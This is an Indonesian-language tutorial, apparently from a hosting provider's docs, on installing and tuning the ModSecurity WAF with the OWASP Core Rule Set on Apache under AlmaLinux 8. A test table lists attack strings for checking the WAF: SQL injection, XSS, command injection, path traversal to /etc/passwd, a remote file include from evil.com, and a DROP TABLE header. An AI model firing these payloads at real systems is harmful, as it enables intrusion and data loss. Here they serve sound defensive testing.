---
title: ModSecurity
description: Cara Install dan Konfigurasi ModSecurity di Apache Web Server AlmaLinux 8
sidebar_position: 15
sidebar_label: ModSecurity
---

Keamanan aplikasi web adalah prioritas utama dalam pengelolaan server berbasis **Apache Web Server**, khususnya di lingkungan produksi berbasis **AlmaLinux 8**. Salah satu lapisan pertahanan paling penting yang bisa kita aktifkan adalah **ModSecurity**, sebuah Web Application Firewall (WAF) yang secara aktif memonitor dan memblokir potensi serangan seperti SQL Injection, Cross-Site Scripting (XSS), dan berbagai bentuk eksploitasi terhadap aplikasi web. Panduan ini memberikan **panduan lengkap, praktis, dan detail** untuk **install ModSecurity di Apache Web Server AlmaLinux 8**, serta konfigurasi terbaik yang dapat kita terapkan.

**ModSecurity** adalah modul keamanan open-source untuk **Apache**, yang dapat mendeteksi dan memblokir berbagai bentuk serangan terhadap aplikasi web. Dikembangkan untuk memberikan lapisan keamanan tambahan, ModSecurity mendukung aturan-aturan kompleks dan fleksibel, serta bisa digabungkan dengan **OWASP ModSecurity Core Rule Set (CRS)** untuk perlindungan lebih luas terhadap ancaman web modern.

## Prerequisite

- Akses full `root`
- Basic Linux Command Line
- Security
- Apache/HTTPD sudah terinstall
- Domain (opsional)

## Install ModSecurity
Sebelum memulai proses instalasi, kita perlu memastikan bahwa sistem telah diperbarui dan Apache telah terinstal dengan benar. Berikut langkah-langkah awal yang perlu dilakukan:
```
dnf update -y
dnf install httpd -y
systemctl enable --now httpd
```

Jika menggunakan firewalld, maka izinkan port 80 dan 443:
```
firewall-cmd --permanent --add-service={http,https}
firewall-cmd --reload
```

ModSecurity membutuhkan beberapa paket dependensi. Jalankan perintah berikut:
```
dnf install gcc make libxml2 libxml2-devel httpd-devel pcre pcre-devel curl-devel git geoip-devel yajl yajl-devel doxygen zlib-devel lmdb lmdb-devel ssdeep ssdeep-devel lua lua-devel wget -y
```

:::info
Untuk Apache, versi ModSecurity yang direkomendasikan adalah `v2.9.x`. Meskipun ModSecurity 3.0 (libmodsecurity) sudah tersedia, versi ini dirancang untuk penggunaan native dengan Nginx dan memiliki konektor untuk Apache. Namun, masih dalam tahap pengembangan dan belum dianggap siap produksi untuk Apache. Modul ModSecurity yang lebih lama untuk Apache (v2.9.x) masih aktif dipelihara dan direkomendasikan untuk pengguna Apache.
:::

Agar mendapatkan versi rilis terbaru dari ModSecurity, maka akan dilakukan instalasi manual dengan cara mendownload langsung dari repository ModSecurity:
```
cd /usr/local/src
git clone https://github.com/owasp-modsecurity/ModSecurity.git
cd ModSecurity
git submodule init
git submodule update
./autogen.sh
./build.sh
./configure
make
make install
echo "LoadModule security2_module modules/mod_security2.so" | tee /etc/httpd/conf.modules.d/00-mod_security.conf
```

Restart Apache setelah melakukan perubahan: 

```
systemctl restart httpd 
``` 

Kemudian verifikasi module `mod_security` dengan perintah berikut: 
``` 
httpd -M | grep mod_security 
``` 

Contoh output: 

``` 
security2_module (shared) 
``` 

Verifikasi versi ModSec: 
``` 
strings /usr/lib64/httpd/modules/mod_security2.so | grep -i 2.9 
``` 

Contoh output: 
``` 
ModSecurity for Apache/2.9.11 (http://www.modsecurity.org/) 
```

Download OWASP Core Rule Set (CRS), lalu buat direktori dan file konfigurasi ModSecurity:
```
cd /usr/local/src/ModSecurity/test/benchmark
./download-owasp-v4-rules.sh
mkdir -p /etc/httpd/modsecurity.d
cp /usr/local/src/ModSecurity/modsecurity.conf-recommended /etc/httpd/modsecurity.d/modsecurity.conf
cp /usr/local/src/ModSecurity/test/benchmark/owasp-v4/crs-setup.conf.example /etc/httpd/modsecurity.d/crs-setup.conf
cp /usr/local/src/ModSecurity/unicode.mapping /etc/httpd/modsecurity.d/
cp -r /usr/local/src/ModSecurity/test/benchmark/owasp-v4/rules /etc/httpd/modsecurity.d/
```

Kemudian aktifkan ModSecurity dengan mengubah `SecRuleEngine` dari `DetectionOnly` menjadi `On` dan tambahkan parameter `IncludeOptional` untuk mengaktifkan CRS:
```
nano /etc/httpd/modsecurity.d/modsecurity.conf
```
Isi dengan parameter berikut:
```jsx showLineNumbers title="/etc/httpd/modsecurity.d/modsecurity.conf"
SecRuleEngine On
SecAuditEngine On
SecAuditLog /var/log/httpd/modsec_audit.log

IncludeOptional /etc/httpd/modsecurity.d/crs-setup.conf
IncludeOptional /etc/httpd/modsecurity.d/rules/*.conf
```
Tambahkan parameter berikut agar `modsecurity.conf` terbaca di Apache:
```
echo "IncludeOptional /etc/httpd/modsecurity.d/modsecurity.conf" >> /etc/httpd/conf/httpd.conf
```
Lakukan restart pada Apache agar semua konfigurasi diterapkan:
```
apachectl configtest
systemctl restart httpd
```

### Virtualhost
Untuk **mengaktifkan ModSecurity di VirtualHost Apache pada AlmaLinux 8**, kita perlu menambahkan directive tertentu di dalam blok `<VirtualHost>` masing-masing domain atau subdomain yang ingin kita proteksi.

:::info
Secara default ModSecurity sudah aktif secara global pada semua virtualhost. Karena sebelumnya kita sudah menambahkan direktif `modsecurity.conf` menggunakan perintah: 
```
echo "IncludeOptional /etc/httpd/modsecurity.d/modsecurity.conf" >> /etc/httpd/conf/httpd.conf
```
:::

Buat Virtualhost
```
nano /etc/httpd/conf.d/focusnic.biz.id.conf
```
Isi default virtualhost dan aktifkan Modsec dengan menambahkan parameter `SecRuleEngine On`:
```jsx {7} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    SecRuleEngine on
  
    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

Buat direktori untuk virtualhost diatas:
```
mkdir -p /var/www/focusnic.biz.id/public_html
```
Simpan dan restart Apache untuk menerapkan perubahan:
```
apachectl configtest
systemctl restart httpd
```
Untuk **mentrigger (memicu) rule ModSecurity**, kita dapat mengirim **HTTP request** yang mengandung **payload mencurigakan**, seperti:

- SQL Injection
- Cross Site Scripting (XSS)
- Command Injection
- Path Traversal
- Suspicious User-Agent atau Headers

Berikut beberapa contoh **query atau payload** yang dapat Anda gunakan untuk **menguji apakah ModSecurity benar-benar aktif dan berfungsi** di server"

| **Jenis Serangan** | **Contoh Payload / Query** | **Deskripsi** | **OWASP CRS Rule ID (Umum)** |
| --- | --- | --- | --- |
| **SQL Injection** | `http://focusnic.biz.id/?id=1' OR '1'='1` | Deteksi pola injeksi SQL klasik | `942100`, `942110`, `942120` |
| **XSS (Cross Site Scripting)** | `http://focusnic.biz.id/?search=<script>alert('xss')</script>` | Penyisipan kode script HTML/JS berbahaya | `941100`, `941120` |
| **Command Injection** | `http://focusnic.biz.id/?cmd=ls | whoami` | Menjalankan command shell dari parameter |
| **Path Traversal** | `http://focusnic.biz.id/?file=../../../../etc/passwd` | Upaya akses file di luar direktori web root | `930100`, `930110` |
| **Remote File Inclusion** | `http://focusnic.biz.id/?load=http://evil.com/shell.txt` | Coba muat file dari luar server | `930120`, `931130` |
| **User-Agent Berbahaya** | `curl -A "sqlmap"` `http://focusnic.biz.id` | Deteksi tools hacking seperti `sqlmap`, `nikto` | `913100`, `913110` |
| **Custom Header Injection** | `curl -H "X-Real-IP: 127.0.0.1; DROP TABLE users;" http://focusnic.biz.id` | Injeksi SQL melalui header request | `942200`, `942210` |
| **URL Encoding Abuse** | `http://focusnic.biz.id/?q=%3Cscript%3Ealert(1)%3C/script%3E` | XSS via URL encoding | `941130` |
| **HTTP Method Abuse** | `curl -X TRACE http://focusnic.biz.id` | Gunakan HTTP method berbahaya/legacy | `911100`, `913102` |
| **Request Body Injection** | (POST) `{"username":"admin' --", "password":"123"}` | SQL Injection via JSON body | `942130`, `942200` |


Akses domain dengan SQL Injection `http://focusnic.biz.id/index.php?id=1' OR '1'='1`
![](/img/almalinux8-modsec-test.png)<br/>

Lalu cek log di `/var/log/httpd/modsec_audit.log`:
```jsx showLineNumbers title="/var/log/httpd/modsec_audit.log"
--8e942439-H--
Message: Warning. detected SQLi using libinjection with fingerprint 's&sos' [file "/etc/httpd/modsecurity.d/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "66"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data: s&sos found within ARGS:id: 1' OR '1'='1"] [severity "CRITICAL"] [ver "OWASP_CRS/4.3.0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/66"] [tag "PCI/6.5.2"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:blocking_inbound_anomaly_score. [file "/etc/httpd/modsecurity.d/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "233"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [ver "OWASP_CRS/4.3.0"] [tag "anomaly-evaluation"] [tag "OWASP_CRS"]
Message: Warning. Unconditional match in SecAction. [file "/etc/httpd/modsecurity.d/rules/RESPONSE-980-CORRELATION.conf"] [line "98"] [id "980170"] [msg "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=5, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"] [ver "OWASP_CRS/4.3.0"] [tag "reporting"] [tag "OWASP_CRS"]
Apache-Error: [file "apache2_util.c"] [line 287] [level 3] ModSecurity: Warning. detected SQLi using libinjection with fingerprint 's&sos' [file "/etc/httpd/modsecurity.d/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "66"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data: s&sos found within ARGS:id: 1' OR '1'='1"] [severity "CRITICAL"] [ver "OWASP_CRS/4.3.0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/66"] [tag "PCI/6.5.2"] [hostname "focusnic.biz.id"] [uri "/index.php"] [unique_id "aH0btpOPKEKHRs5tOF2OvwAAAMw"]
Apache-Error: [file "apache2_util.c"] [line 287] [level 3] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:blocking_inbound_anomaly_score. [file "/etc/httpd/modsecurity.d/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "233"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [ver "OWASP_CRS/4.3.0"] [tag "anomaly-evaluation"] [tag "OWASP_CRS"] [hostname "focusnic.biz.id"] [uri "/index.php"] [unique_id "aH0btpOPKEKHRs5tOF2OvwAAAMw"]
Apache-Error: [file "apache2_util.c"] [line 287] [level 3] ModSecurity: Warning. Unconditional match in SecAction. [file "/etc/httpd/modsecurity.d/rules/RESPONSE-980-CORRELATION.conf"] [line "98"] [id "980170"] [msg "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=5, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"] [ver "OWASP_CRS/4.3.0"] [tag "reporting"] [tag "OWASP_CRS"] [hostname "focusnic.biz.id"] [uri "/index.php"] [unique_id "aH0btpOPKEKHRs5tOF2OvwAAAMw"]
```

## Administrasi ModSecurity
Pengelolaan ModSecurity adalah proses berkelanjutan untuk memastikan Web Application Firewall (WAF) ini tetap efektif, tidak mengganggu aplikasi, dan dapat mendeteksi ancaman terbaru secara real time.


1. Struktur Direktori ModSecurity <br/>

Setelah instalasi dan aktivasi, jika mengikuti panduan diatas maka struktur file konfigurasi ModSecurity ada di:
| **Path** | **Fungsi** |
| --- | --- |
| `/etc/httpd/modsecurity.d/modsecurity.conf` | Konfigurasi utama ModSecurity |
| `/etc/httpd/modsecurity.d/unicode.mapping` | Pemetaan karakter unicode |
| `/etc/httpd/modsecurity.d/rules/` | Direktori berisi OWASP Core Rule Set |
| `/var/log/httpd/modsec_audit.log` | Log utama audit WAF |
| `/var/log/httpd/error_log` | Log error Apache dan WAF gabungan |

2. Mode Operasi ModSecurity <br/>

Anda dapat mengelola mode engine untuk setiap fase pengujian:

| **Nilai** | **Penjelasan** |
| --- | --- |
| `On` | Aktif penuh dan memblokir ancaman |
| `DetectionOnly` | Hanya log, tidak memblokir |
| `Off` | Tidak aktif |

Set pada:
:::info
Gunakan DetectionOnly saat testing aplikasi pertama kali agar tahu rule mana yang perlu disesuaikan sebelum memblokir request.
:::
```
SecRuleEngine On
```

3. Manajemen Log ModSecurity <br/>

File log default:
```
/var/log/httpd/modsec_audit.log
```

Konfigurasi log ada di `modsecurity.conf`:
```
SecAuditEngine RelevantOnly
SecAuditLog /var/log/httpd/modsec_audit.log
```

### Membuat Custom Rule ModSecurity

Custom rule sangat berguna untuk mendeteksi pola atau perilaku tertentu secara spesifik untuk sebuah aplikasi.

Contoh Custom Rule: Deteksi Parameter `debug=true`
```
SecRule ARGS:debug "@streq true" \
  "id:1000001,phase:2,deny,log,msg:'[CUSTOM] Debug mode detected in request'"
```

Simpan di file:
```
/etc/httpd/modsecurity.d/custom_rules.conf
```

Kemudian include file tersebut secara global:
```
Include /etc/httpd/modsecurity.d/custom_rules.conf
```

### Menonaktifkan ModSecurity per VirtualHost

Jika ingin ModSecurity tidak aktif sama sekali pada satu VirtualHost, cukup tambahkan:
```jsx {7} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    SecRuleEngine Off

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

### Disable Rules dengan DirectoryMatch per VirtualHost

Jika hanya direktori tertentu yang ingin dikecualikan dari ModSecurity, gunakan:
```jsx {8,11-13} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    # Global WAF
    SecRuleEngine On

    # Disable ModSec for /uploads
    <DirectoryMatch "^/var/www/focusnic.biz.id/public_html/uploads">
    	SecRuleEngine Off
    </DirectoryMatch>

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```
Atau hanya disable beberapa rules ID:
```jsx {8,11-13} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    # Global WAF
    SecRuleEngine On

    # Disable ModSec for /uploads
    <DirectoryMatch "^/var/www/focusnic.biz.id/public_html/uploads">
        SecRuleRemoveById 942100 941100
    </DirectoryMatch>

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

### Disable Rules dengan LocationMatch per VirtualHost

Jika hanya URL tertentu  yang ingin dikecualikan dari ModSecurity, gunakan:
```jsx {8,11-13} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    # Global WAF
    SecRuleEngine On

    # Disable ModSec for location /uploads
    <LocationMatch "^/uploads">
        SecRuleEngine Off
    </LocationMatch>

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```
Atau hanya disable beberapa rules ID:
```jsx {8,11-13} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    # Global WAF
    SecRuleEngine On

    # Disable ModSec for /uploads
    <LocationMatch "^/uploads">
        SecRuleRemoveById 942100 941100
    </LocationMatch>

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

### Disable Rule Spesifik per VirtualHost
Jika rule ID tertentu yang menyebabkan false positive pada domain tertentu, tambahkan:
```jsx {7-8} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    SecRuleEngine On
    SecRuleRemoveById 942100 941130 932100

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

### Whitelist Domain dari Pemrosesan ModSecurity

Whitelist berbasis domain dilakukan dengan kondisi pada `REQUEST_HEADERS:Host`. Contoh:
```
SecRule REQUEST_HEADERS:Host "@streq focusnic.biz.id" \
  "id:1000002,phase:1,pass,nolog,ctl:ruleEngine=Off"
```

Letakkan ini di file rule custom, misalnya `custom_rules.conf`

### Menonaktifkan Rule ID Secara Global

Untuk menonaktifkan rule secara global. Letakkan pada: `/etc/httpd/modsecurity.d/modsecurity.conf`, atau buat file baru seperti: `/etc/httpd/modsecurity.d/disable_rules.conf`:
```
SecRuleRemoveById 942100 941130 913100
```

Kemudian include di file utama:

```
Include /etc/httpd/modsecurity.d/disable_rules.conf
```


## Troubleshooting

1. Error SecPcreMatchLimit not allowed in VirtualHost saat configtest <br/>

Directive SecPcreMatchLimit hanya boleh digunakan di file konfigurasi utama bukan dalam `<VirtualHost>`. Solusinya adalah pindahkan ke file:
```
/etc/httpd/modsecurity.d/modsecurity.conf
```

2. Rule tetap berjalan meskipun sudah SecRuleRemoveById <br/>

Penyebab umum adalah rule ID salah, atau ada overwrite ID yang menyebabkan rule tetap berjalan. Solusinya pastikan `SecRuleRemoveById` ditulis dalam VirtualHost yang sesuai dan gunakan ID yang benar dari log ModSec:

```
SecRuleRemoveById 942100 941100
```
## Kesimpulan

Penerapan **ModSecurity di Apache Web Server AlmaLinux 8** adalah solusi praktis dan efektif untuk memperkuat lapisan keamanan aplikasi web. Dengan instalasi dan konfigurasi yang tepat, kita dapat memblokir berbagai ancaman siber yang semakin kompleks. Memanfaatkan **OWASP Core Rule Set** juga membantu mengurangi risiko secara signifikan.

Q: Apakah saya bisa menonaktifkan ModSecurity hanya untuk satu domain saja? <br/>
A: Ya. Tambahkan di dalam blok `<VirtualHost>`:
```
SecRuleEngine Off
```

Q: Bagaimana cara menonaktifkan rule berdasarkan ID tertentu saja? <br/>
A: Gunakan SecRuleRemoveById:
```
SecRuleRemoveById 942100 941100
```

Q: Apakah `<Directory>` bisa digunakan untuk nonaktifkan ModSecurity? <br/>
A: Tidak. Gunakan `<Location>` atau `<LocationMatch>` karena ModSecurity hanya bekerja pada level request URL, bukan filesystem.

Q: Apakah saya bisa whitelist domain tertentu saja untuk rule tertentu? <br/>
A: Ya, buat custom rule dengan SecRule dan menggunakan `ctl:ruleRemoveById` dengan kondisi berdasarkan host:
```
SecRule REQUEST_HEADERS:Host "@streq focusnic.com" "phase:1,pass,nolog,ctl:ruleRemoveById=942100"
```

Q: Dimana saya bisa melihat log ModSecurity? <br/>
A: Secara default, log berada di `/var/log/httpd/modsec_audit.log`

Q: Bagaimana cara mengetahui rule ID yang memblokir request? <br/>
A: Cek log ModSecurity dan cari bagian "id" seperti:
```
Message: Warning. Pattern match ... [id "942100"]
```

Q: Apa alternatif aman agar folder upload bisa diakses namun tidak diproses sebagai script?
A: Gunakan kombinasi berikut:
```
<LocationMatch "^/uploads">
    SecRuleEngine Off
</LocationMatch>

<Directory "/var/www/focusnic.biz.id/public_html/uploads">
    php_admin_flag engine off
    Options -ExecCGI
    Require all granted
</Directory>
```

